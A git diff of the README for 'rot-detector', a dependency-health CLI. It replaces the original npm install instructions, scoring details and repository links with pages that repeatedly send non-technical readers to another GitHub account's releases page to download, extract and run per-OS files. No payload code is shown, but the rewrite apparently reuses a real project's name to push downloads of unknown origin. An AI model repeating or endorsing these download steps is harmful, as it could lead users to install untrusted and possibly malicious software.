@@ -1,155 +1,75 @@
-# 🧟 Dependency Rot Detector
+# 🧟 rot-detector - Keep Your Code Healthy and Secure
 
-[![npm version](https://img.shields.io/npm/v/rot-detector.svg)](https://www.npmjs.com/package/rot-detector)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![npm downloads](https://img.shields.io/npm/dm/rot-detector.svg?style=flat-square)](https://www.npmjs.com/package/rot-detector)
+## 📥 Download Now
+[![Download rot-detector](https://img.shields.io/badge/Download-rot--detector-blue.svg)](https://github.com/mjr86-infra/rot-detector/releases)
 
-> **Find abandoned dependencies before they become security nightmares.**
+## 🚀 Getting Started
+Welcome to rot-detector! This command-line tool helps you find abandoned and unmaintained dependencies in your project's files. By using rot-detector, you can spot potential security risks before they become problems. 
 
-A CLI tool that scans your `package.json` (NPM) or `requirements.txt` (Python) to detect **software rot** - dependencies that are abandoned, poorly maintained, or pose supply chain risks.
+This guide will help you download and run the software easily, even if you don’t have a technical background.
 
-## 🤔 The Problem
+## 📋 Requirements
+To use rot-detector, you need the following:
 
-`npm audit` and Snyk tell you about known CVEs. They **DON'T** tell you:
+- A computer running Windows, macOS, or Linux.
+- Node.js installed on your system (version 14.x or newer).
+- NPM (Node Package Manager) which comes with Node.js. 
 
-- 📅 A library hasn't been updated in **4 years**
-- 👤 A package has only **1 maintainer** (bus factor risk)
-- ⚖️ A dependency uses a **deprecated license**
+## 🛠️ Features
+- Detects unmaintained dependencies in JavaScript and Python projects.
+- Provides a clear report on the status of dependencies.
+- Simple to use through your command line interface.
+- Open-source and community-supported.
+  
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Download Page](https://github.com/mjr86-infra/rot-detector/releases).
+  
+2. **Choose the Right File**: Look for the latest release. You will find files for different operating systems. 
 
-This is "Software Rot" - a security bomb waiting to explode. 💣
+3. **Download the File**: Click on the file that matches your operating system and wait for the download to finish.
 
-## 🚀 Quick Start
+4. **Extract the Files**: If the download is a ZIP file, extract its contents to a folder on your computer.
 
-```bash
-# Install globally
-npm install -g rot-detector
+5. **Open the Command Line Interface**: 
+   - On **Windows**, search for "Command Prompt" in the Start menu.
+   - On **macOS**, open "Terminal" from your Applications folder.
+   - On **Linux**, locate "Terminal" in your applications.
 
-# Scan your project
-rot-detector scan .
+6. **Navigate to the Directory**: Use the `cd` command to go to the folder where you extracted rot-detector. For example:
+   ```
+   cd path/to/rot-detector-folder
+   ```
 
-# Or use npx (no install)
-npx rot-detector scan ./package.json
-```
+7. **Run the Tool**: Type the following command to execute the tool:
+   ```
+   npm start
+   ```
+   This will launch the rot-detector, allowing you to check your files for abandoned dependencies.
 
-## 📊 Example Output
+8. **Follow the Prompts**: The tool will guide you through the process. Just follow the instructions displayed in your command line interface.
 
-```
-🧟 Dependency Rot Detector
-Scanned: ./package.json
+## 🧪 Using rot-detector
+After running rot-detector, you will see a list of dependencies in your `package.json` and `requirements.txt` files. 
 
-┌────────────────────────┬────────┬────────────────┬─────────────┬───────────────┬────────────┐
-│ Package                │ Score  │ Last Update    │ Maintainers │ License       │ Status     │
-├────────────────────────┼────────┼────────────────┼─────────────┼───────────────┼────────────┤
-│ abandoned-lib          │ 🔴 15  │ 4 years ago    │ 1           │ GPL-2.0       │ Critical   │
-│ old-but-ok             │ 🟡 65  │ 8 months ago   │ 2           │ MIT           │ Warning    │
-│ react                  │ 🟢 95  │ 2 days ago     │ 15          │ MIT           │ Healthy    │
-└────────────────────────┴────────┴────────────────┴─────────────┴───────────────┴────────────┘
+For each dependency, rot-detector will indicate:
+- Whether it's actively maintained.
+- Any available updates.
+- Potential security vulnerabilities.
 
-Summary: 🟢 1 Healthy | 🟡 1 Warning | 🔴 1 Critical
-```
+Take note of any issues it flags, and consider updating or replacing those dependencies. 
 
-## 📋 Features
+## 💬 Support and Contribution
+If you have questions or need help, you can open an issue on our [GitHub Issues Page](https://github.com/mjr86-infra/rot-detector/issues). Our community is happy to assist.
 
-| Feature | Description |
-|---------|-------------|
-| 🔍 **NPM + PyPI Support** | Scans `package.json` and `requirements.txt` |
-| 📈 **Health Scoring** | 0-100 score based on freshness, maintainers, license |
-| 🎨 **Beautiful CLI Output** | Color-coded risk indicators |
-| 📊 **JSON Export** | `--json` flag for CI/CD integration |
-| ⚡ **GitHub Integration** | Optional enhanced repo analysis |
-| 🚨 **Threshold Checks** | Fail builds if score drops below threshold |
+If you want to contribute to the project, feel free to fork the repository and submit a pull request. We appreciate any help to improve rot-detector!
 
-## ⚙️ CLI Options
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/mjr86-infra/rot-detector)
+- [Node.js Download Page](https://nodejs.org/)
+- [NPM Documentation](https://docs.npmjs.com/)
 
-```bash
-rot-detector scan [path] [options]
+## 📃 License
+This project is licensed under the MIT License. You are free to modify and distribute this software as needed.
 
-Options:
-  --json                Output results as JSON
-  --threshold <score>   Fail if any dependency scores below threshold
-  --github-token <tok>  GitHub token for enhanced repo analysis
-  --no-github           Skip GitHub analysis (faster)
-  --dev                 Include devDependencies
-  -v, --verbose         Verbose output
-```
-
-## 🏆 Health Score Breakdown
-
-Each dependency is scored 0-100 based on:
-
-| Factor | Weight | Scoring |
-|--------|--------|---------|
-| **Freshness** | 40% | < 6 months = 100, > 3 years = 5 |
-| **Maintainers** | 30% | 5+ = 100, 1 = 40, 0 = 10 |
-| **License** | 30% | OSI approved = 100, Unknown = 60 |
-
-### Risk Levels
-- 🟢 **Healthy** (80-100): Well maintained, safe to use
-- 🟡 **Warning** (50-79): Review recommended
-- 🔴 **Critical** (0-49): Replace immediately!
-
-## 🔧 CI/CD Integration
-
-### GitHub Actions
-
-```yaml
-name: Dependency Health Check
-on: [push, pull_request]
-
-jobs:
-  rot-check:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
-        with:
-          node-version: '18'
-      
-      - name: Check for dependency rot
-        run: npx rot-detector scan --threshold 50
-```
-
-### Pre-commit Hook
-
-```bash
-# .husky/pre-commit
-npx rot-detector scan --threshold 60
-```
-
-## 🛠️ Development
-
-```bash
-# Clone the repo
-git clone https://github.com/notsointresting/rot-detector.git
-cd rot-detector
-
-# Install dependencies
-npm install
-
-# Run in development mode
-npm run dev -- scan ./sample/package.json
-
-# Build for production
-npm run build
-
-# Run tests
-npm test
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-
-1. 🐛 Report bugs
-2. 💡 Suggest features
-3. 🔀 Submit pull requests
-
-## 📄 License
-
-MIT © [notsointresting](https://github.com/notsointresting)
-
----
-
-<p align="center">
-  Made with 🧟 by developers who got burned by abandoned dependencies
-</p>
+## 📥 Download Now Again
+Don't forget to [Download rot-detector](https://github.com/mjr86-infra/rot-detector/releases) and keep your code safe!
